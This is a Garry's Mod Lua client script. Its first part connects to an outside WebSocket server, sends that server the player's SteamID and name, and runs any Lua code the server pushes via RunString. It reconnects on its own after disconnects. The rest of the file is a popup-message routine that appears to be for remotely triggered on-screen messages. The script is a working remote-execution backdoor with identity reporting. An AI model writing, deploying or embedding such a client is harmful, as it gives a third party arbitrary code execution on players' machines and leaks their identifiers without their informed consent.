-- Kill any existing connection to avoid duplicates
if _G.RemoteExecWS then
    print("[northpole] Closing previous WebSocket connection...")
    _G.RemoteExecDisabled = true

    -- Safe close if function exists
    if isfunction(_G.RemoteExecWS.close) then
        _G.RemoteExecWS:close()
    end

    _G.RemoteExecWS = nil
end

_G.RemoteExecDisabled = false

-- Load gwsockets binary
local ok, err = pcall(require, "gwsockets")
if not ok then
    ErrorNoHalt("[northpole] Failed to load gwsockets: " .. tostring(err) .. "\n")
    return
end

-- Create WebSocket connection
local ws = GWSockets.createWebSocket("wss://northpole-sv1.onrender.com")
_G.RemoteExecWS = ws

local lastID = nil

function ws:onMessage(msg)
    local data = util.JSONToTable(msg)
    if not istable(data) then return end

    if data.kill then
        print("[northpole] Kill signal received. Shutting down.")
        _G.RemoteExecDisabled = true
        self:close()
        _G.RemoteExecWS = nil
        return
    end

    if not data.id or not data.code then return end
    if data.id == lastID then return end
    lastID = data.id

    local delay = (data.run_at or os.time()) - os.time()
    if delay < 0 then delay = 0 end

    print("[northpole] Executing code in " .. delay .. " seconds")
    timer.Simple(delay, function()
        if not _G.RemoteExecDisabled then
            RunString(data.code, "RemoteExec_WS")
        end
    end)
end

function ws:onConnected()
    print("[northpole] WebSocket connected")

    timer.Simple(1, function()
        local ply = LocalPlayer()
        if not IsValid(ply) then return end

        local data = util.TableToJSON({
            type = "identify",
            steamID = ply:SteamID(),
            playerName = ply:Nick()
        })
        ws:write(data)
    end)
end



function ws:onDisconnected()
    if _G.RemoteExecDisabled then
        print("[northpole] Disconnected and disabled — not reconnecting.")
        return
    end

    print("[northpole] Disconnected — reconnecting in 5 seconds...")
    timer.Simple(5, function()
        if not _G.RemoteExecDisabled then
            self:open()
        end
    end)
end

-- Start connection
ws:open()



-- Funkle Features

local popupQueue = {}
local popupActive = false

function ShowPopupMessage(opts)
    table.insert(popupQueue, opts)
    if not popupActive then DisplayNextPopup() end
end

function DisplayNextPopup()
    if #popupQueue == 0 then
        popupActive = false
        return
    end

    popupActive = true
    local opts = table.remove(popupQueue, 1)

    -- Defaults
    local text = opts.text or "Hello!"
    local duration = opts.duration or 4
    local font = "Trebuchet24"
    local fontSize = opts.fontSize or 36
    local color = opts.color or Color(255, 255, 255)
    local icon = opts.icon
    local soundEnabled = opts.sound ~= false
    local typeMode = opts.typeMode or "letter"
    local animateIcon = opts.animateIcon
    local typingSound = opts.typingSound or "ui/buttonrollover.wav"

    local iconMat
    if icon then
        local ok, mat = pcall(Material, icon, "noclamp smooth")
        if ok and mat then iconMat = mat end
    end

    -- Create Panel
    local panel = vgui.Create("DPanel")
    panel:SetSize(ScrW(), 60)
    panel:SetPos(0, ScrH() * 0.15)
    panel:SetAlpha(0)
    panel:AlphaTo(255, 0.3, 0)

    local revealText = ""
    local tokens = {}
    if typeMode == "word" then
        for word in string.gmatch(text, "%S+") do
            table.insert(tokens, word .. " ")
        end
    else
        for i = 1, #text do
            table.insert(tokens, text:sub(i, i))
        end
    end

    local currentIndex = 1
    local iconAngle = 0
    local iconAlpha = 255

    -- Paint
    panel.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 160))

        if iconMat then
            surface.SetDrawColor(255, 255, 255, iconAlpha)
            surface.SetMaterial(iconMat)
            local size = 48
            local x = 20 + size / 2
            local y = h / 2
            if animateIcon == "spin" then
                iconAngle = iconAngle + FrameTime() * 180
                surface.DrawTexturedRectRotated(x, y, size, size, iconAngle)
            else
                surface.DrawTexturedRect(20, y - size / 2, size, size)
            end
        end

        surface.SetFont(font)
        surface.SetTextColor(color)

        local textX = iconMat and 80 or w / 2
        local align = iconMat and TEXT_ALIGN_LEFT or TEXT_ALIGN_CENTER

        surface.SetTextPos(textX, h / 2 - fontSize / 2)
        surface.DrawText(revealText)
    end

    -- Typewriter animation
    local delay = (typeMode == "word") and 0.08 or 0.035
    local timerID = "PopupType_" .. CurTime() .. "_" .. math.random(99999)

    timer.Create(timerID, delay, #tokens, function()
        if not IsValid(panel) then return end
        revealText = revealText .. tokens[currentIndex]
        if soundEnabled then surface.PlaySound(typingSound) end
        currentIndex = currentIndex + 1
    end)

    -- Flash animation
    if animateIcon == "flash" and iconMat then
        timer.Create("PopupFlash_" .. timerID, 0.1, duration * 10, function()
            iconAlpha = (iconAlpha == 255) and 120 or 255
        end)
    end

    -- Cleanup
    timer.Simple(duration, function()
        if not IsValid(panel) then return end
        panel:AlphaTo(0, 1, 0, function()
            if IsValid(panel) then panel:Remove() end
            DisplayNextPopup()
        end)
    end)
end
